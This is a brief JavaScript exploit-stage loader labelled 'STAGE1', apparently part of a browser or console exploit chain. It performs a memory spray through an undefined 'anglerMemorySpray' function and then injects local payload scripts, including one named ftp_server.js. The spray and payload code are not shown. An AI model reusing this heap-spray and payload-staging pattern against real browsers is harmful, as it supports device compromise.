console.log("[STAGE1] Loaded");

window.r = {}; // Make global

class Stage1 {
    performMemorySpray() {
        this.sprayArray = anglerMemorySpray(5000, 1024);
    }
    loadPayloads() {
        const payloads = [
            "./payloads/payload1.js",
            "./payloads/hello_world.js",
            "./payloads/ftp_server.js"
        ];
        payloads.forEach(payload => {
            const script = document.createElement("script");
            script.src = payload;
            script.async = false;
            script.onload = () => console.log(`[PAYLOAD]: Loaded ${payload}`);
            document.body.appendChild(script);
        });
    }
    runExploit() {
        this.performMemorySpray();
        this.loadPayloads();
        console.log("[STAGE1] Exploitation completed.");
    }
}
window.r.si = function() {
    const stg = new Stage1();
    stg.runExploit();
};
